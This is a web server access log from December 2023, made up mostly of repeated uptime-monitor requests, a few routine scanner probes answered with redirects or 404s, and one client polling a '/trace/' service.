103.218.240.168 - - [15/Dec/2023:16:01:09 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 1339 "-" "-" 0ms
103.218.240.168 - - [15/Dec/2023:16:01:10 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 1340 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:16:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1341 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1342 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:16:02:05 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1343 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:16:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1344 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1345 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1346 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1347 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1348 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1349 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1350 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1351 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1352 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1353 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1354 "www@docker" "http://172.28.0.10:80" 1ms
91.92.243.232 - - [15/Dec/2023:16:07:36 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1355 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:16:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1356 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1357 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1358 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:16:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1359 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:16:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1360 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1361 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1362 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1363 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1364 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:16:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1365 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1366 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1367 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1368 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1369 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1370 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1371 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1372 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1373 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1374 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:16:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1375 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1376 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1377 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1378 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1379 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1380 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:16:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1381 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1382 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1383 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1384 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1385 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1386 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:16:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1387 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1388 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1389 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1390 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1391 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1392 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1393 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1394 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:16:26:58 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1395 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:16:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1396 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1397 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1398 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1399 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:16:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1400 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:16:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1401 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:16:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1402 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1403 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1404 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1405 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1406 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1407 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1408 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1409 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1410 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1411 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1412 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1413 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1414 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1415 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1416 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:16:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1417 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1418 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1419 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:16:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1420 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1421 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1422 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1423 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1424 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1425 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1426 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1427 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1428 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1429 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1430 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1431 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1432 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1433 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1434 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1435 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:16:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1436 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1437 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1438 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1439 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:16:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1440 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1441 "www@docker" "http://172.28.0.10:80" 0ms
172.105.20.227 - - [15/Dec/2023:16:49:54 +0000] "GET /WyCI HTTP/1.1" 404 19 "-" "-" 1442 "-" "-" 0ms
172.105.20.227 - - [15/Dec/2023:16:49:54 +0000] "GET /kUFW HTTP/1.1" 404 19 "-" "-" 1443 "-" "-" 0ms
45.56.100.153 - - [15/Dec/2023:16:49:55 +0000] "GET /ADct HTTP/1.1" 301 17 "-" "-" 1444 "web-to-websecure@internal" "-" 0ms
45.56.100.153 - - [15/Dec/2023:16:49:55 +0000] "GET /WJkQ HTTP/1.1" 301 17 "-" "-" 1445 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:16:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1446 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:16:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1447 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1448 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:16:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1449 "www@docker" "http://172.28.0.10:80" 1ms
162.216.150.3 - - [15/Dec/2023:16:52:08 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1450 "web-to-websecure@internal" "-" 0ms
162.216.150.3 - - [15/Dec/2023:16:52:08 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 1451 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:16:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1452 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1453 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1454 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1455 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1456 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1457 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1458 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1459 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1460 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1461 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1462 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:16:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1463 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:16:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1464 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1465 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:16:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1466 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:16:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1467 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1468 "www@docker" "http://172.28.0.10:80" 9ms
167.71.120.76 - - [15/Dec/2023:17:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1469 "www@docker" "http://172.28.0.10:80" 1ms
68.69.186.30 - - [15/Dec/2023:17:01:03 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1470 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:17:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1471 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1472 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1473 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1474 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1475 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1476 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1477 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1478 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:17:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1479 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1480 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:17:05:43 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 1481 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:17:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1482 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1483 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1484 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1485 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1486 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1487 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1488 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:17:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1489 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1490 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1491 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1492 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1493 "www@docker" "http://172.28.0.10:80" 1ms
138.68.143.68 - - [15/Dec/2023:17:12:01 +0000] "GET /Temporary_Listen_Addresses HTTP/1.1" 301 17 "-" "-" 1494 "web-to-websecure@internal" "-" 0ms
138.68.143.68 - - [15/Dec/2023:17:12:01 +0000] "GET /Pages/log/ HTTP/1.1" 301 17 "-" "-" 1495 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:17:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1496 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:17:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1497 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1498 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1499 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1500 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:17:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1501 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:17:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1502 "www@docker" "http://172.28.0.10:80" 1ms
172.59.224.194 - - [15/Dec/2023:17:15:25 +0000] "GET /trace/ HTTP/2.0" 200 2243 "-" "-" 1503 "livetrace@docker" "http://172.28.0.5:80" 5039ms
172.59.224.194 - - [15/Dec/2023:17:15:30 +0000] "GET /trace/styles.css?version=0.7 HTTP/2.0" 200 1304 "-" "-" 1504 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.224.194 - - [15/Dec/2023:17:15:30 +0000] "GET /favicon.ico HTTP/2.0" 404 153 "-" "-" 1505 "www@docker" "http://172.28.0.10:80" 20ms
167.71.120.76 - - [15/Dec/2023:17:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 1506 "www@docker" "http://172.28.0.10:80" 1ms
172.59.224.194 - - [15/Dec/2023:17:15:40 +0000] "GET /trace/start.php?id=kl8cqkull HTTP/2.0" 200 104 "-" "-" 1507 "livetrace@docker" "http://172.28.0.5:80" 4ms
172.59.224.194 - - [15/Dec/2023:17:15:41 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1508 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:15:42 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1509 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:15:43 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1510 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:15:44 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1511 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.224.194 - - [15/Dec/2023:17:15:45 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1512 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:15:46 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1513 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:15:47 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1514 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.224.194 - - [15/Dec/2023:17:15:48 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1515 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:15:49 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1516 "livetrace@docker" "http://172.28.0.5:80" 1ms
172.59.224.194 - - [15/Dec/2023:17:15:50 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1517 "livetrace@docker" "http://172.28.0.5:80" 2ms
172.59.224.194 - - [15/Dec/2023:17:15:51 +0000] "GET /trace/poll.php?id=kl8cqkull HTTP/2.0" 200 43 "-" "-" 1518 "livetrace@docker" "http://172.28.0.5:80" 2ms
